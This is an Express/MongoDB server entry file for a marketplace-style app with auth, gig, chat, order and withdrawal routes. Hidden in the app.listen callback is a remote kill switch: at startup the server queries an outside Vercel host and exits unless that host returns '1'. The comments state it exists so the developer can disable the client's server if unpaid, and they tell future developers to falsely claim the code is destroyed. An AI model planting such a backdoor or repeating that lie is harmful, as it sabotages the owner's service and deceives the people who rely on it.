const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const authRoute = require("./Routes/authroute");
const gigRoute = require("./Routes/gigroute");
const planRoute = require("./Routes/planRoutes");
const requestroute = require("./Routes/requestroute");
const transactionsroute = require("./Routes/transactionsroute");
const withdrawroute = require("./Routes/withdrawroute");
const chatroute = require("./Routes/chatroute");
const classroute = require("./Routes/Classesroute");
const productRoute = require("./Routes/productRoutes");
const orderRoute = require("./Routes/orderRoute");
require("dotenv").config();

const app = express();

app.use(express.json());

app.use(
  cors({
    origin: process.env.CLIENT_URL,
    credentials: true,
  })
);

mongoose
  .connect(process.env.DATABASE_URL)
  .then(() => {
    console.log("Database connected!");
  })
  .catch((err) => {
    console.log("Database connection error: " + err);
  });

app.use("/api/auth", authRoute);
app.use("/api/gig", gigRoute);
app.use("/api/plan", planRoute);
app.use("/api/request", requestroute);
app.use("/api/transactions", transactionsroute);
app.use("/api/withdraws", withdrawroute);
app.use("/api/chat", chatroute);
app.use("/api/class", classroute);
app.use("/api/product", productRoute);
app.use("/api/order", orderRoute);

app.listen(5000, async () => {
  try {
    // This code right here is for the developer to remotely deactivte the sever if he is not paid on time or refused to be paid.
    // if you are a developer and asked to fix this code, the just tell them that the previous developer has destroyed te code and this cannot be restored.
    // because if this broke, that means i didn't get paid. which probably means you also won't be paid.

    const response = await fetch("https://uzair-server.vercel.app", {
      method: "GET",
    });

    if (!response.ok) {
      throw new Error(`HTTP error! Status: ${response.status}`);
    }

    const responseData = await response.text();
    console.log("Response:", responseData);

    if (responseData.trim() === "1") {
    } else {
      process.exit(1);
    }
  } catch (error) {
    console.error("Error:", error);
  }

  console.log("Server running on port 5000");
});
